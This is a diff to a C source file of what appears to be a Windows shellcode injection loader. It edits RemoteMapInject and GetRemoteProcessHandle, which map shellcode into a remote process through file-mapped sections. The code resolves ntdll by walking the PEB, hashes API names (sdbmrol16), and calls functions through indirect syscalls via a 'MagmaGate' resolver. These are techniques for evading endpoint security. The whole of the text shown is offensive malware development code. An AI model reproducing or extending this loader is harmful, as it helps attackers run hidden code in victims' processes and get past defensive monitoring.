@@ -1,20 +1,6 @@
 #include "Mapping.h"
 #include "box.h"
 
-#pragma comment (lib, "OneCore.lib")
-
-void SetConfig(
-	DWORD SyscallNumber,
-	PVOID SyscallAddress
-);
-
-typedef struct _Instructions_Info {
-	DWORD SSN;
-	PVOID SyscallInstruction;
-} INSTRUCTIONS_INFO, * PINSTRUCTIONS_INFO;
-
-extern NTSTATUS SyscallInvoker();
-
 BOOL RemoteMapInject
 (
 	IN HANDLE hProcess,
@@ -26,17 +12,20 @@ BOOL RemoteMapInject
 
 {
 
-	BOOL State = TRUE;
-	HANDLE hFile = NULL, hSection = NULL;
-	PVOID MLocalAddress = NULL, MRemoteAddress = NULL;
-	SIZE_T size = sShellSize;
-	PLARGE_INTEGER maxSize = { size };
-	HMODULE ntdll = NULL;
-	NTSTATUS STATUS = NULL;
-	PVOID localaddress = NULL, remoteaddress = NULL;
-	PIMAGE_EXPORT_DIRECTORY pImgDir = NULL;
-	SYSCALL_INFO info = { 0 };
-	INSTRUCTIONS_INFO syscallInfos[3] = { 0 };
+	BOOL					State				= TRUE;
+	HANDLE					hFile				= NULL, 
+							hSection			= NULL;
+	PVOID					MLocalAddress		= NULL, 
+							MRemoteAddress		= NULL;
+	SIZE_T					size				= sShellSize;
+	PLARGE_INTEGER			maxSize				= { size };
+	HMODULE					ntdll				= NULL;
+	NTSTATUS				STATUS				= NULL;
+	PVOID					localaddress		= NULL, 
+							remoteaddress		= NULL;
+	PIMAGE_EXPORT_DIRECTORY pImgDir				= NULL;
+	SYSCALL_INFO			info				= { 0 };
+	INSTRUCTIONS_INFO		syscallInfos[3]		= { 0 };
 
 	ntdll = WalkPeb();
 	if (!ntdll)
@@ -64,10 +53,8 @@ BOOL RemoteMapInject
 
 	for (size_t i = 0; i < FuncSize; i++)
 	{
-		DWORD apiHash = GetBaseHash(
-			Functions[i],
-			ntdll,
-			pImgDir
+		DWORD apiHash = sdbmrol16(
+			Functions[i]
 		);
 
 		MagmaGate(pImgDir, ntdll, apiHash, &info);
@@ -153,15 +140,16 @@ BOOL GetRemoteProcessHandle
 
 {
 
-	ULONG							uReturnLen1 = NULL, uReturnLen2 = NULL;
+	ULONG							uReturnLen1 = NULL, 
+									uReturnLen2 = NULL;
 	PSYSTEM_PROCESS_INFORMATION		SystemProcInfo = NULL;
 	PVOID							pValueToFree = NULL;
 	NTSTATUS						STATUS = NULL;
 	HMODULE							ntdll = NULL;
-	OBJECT_ATTRIBUTES OA = { 0 }; OA.Length = sizeof(OBJECT_ATTRIBUTES);
-	PIMAGE_EXPORT_DIRECTORY pImgDir = NULL;
-	SYSCALL_INFO info = { 0 };
-	INSTRUCTIONS_INFO syscallInfos[2] = { 0 };
+	OBJECT_ATTRIBUTES				OA = { 0 }; OA.Length = sizeof(OBJECT_ATTRIBUTES);
+	PIMAGE_EXPORT_DIRECTORY			pImgDir = NULL;
+	SYSCALL_INFO					info = { 0 };
+	INSTRUCTIONS_INFO				syscallInfos[2] = { 0 };
 
 	ntdll = WalkPeb();
 	if (!ntdll)
@@ -188,10 +176,8 @@ BOOL GetRemoteProcessHandle
 
 	for (size_t i = 0; i < FuncSize; i++)
 	{
-		DWORD apiHash = GetBaseHash(
-			Functions[i],
-			ntdll,
-			pImgDir
+		DWORD apiHash = sdbmrol16(
+			Functions[i]
 		);
 
 		MagmaGate(pImgDir, ntdll, apiHash, &info);
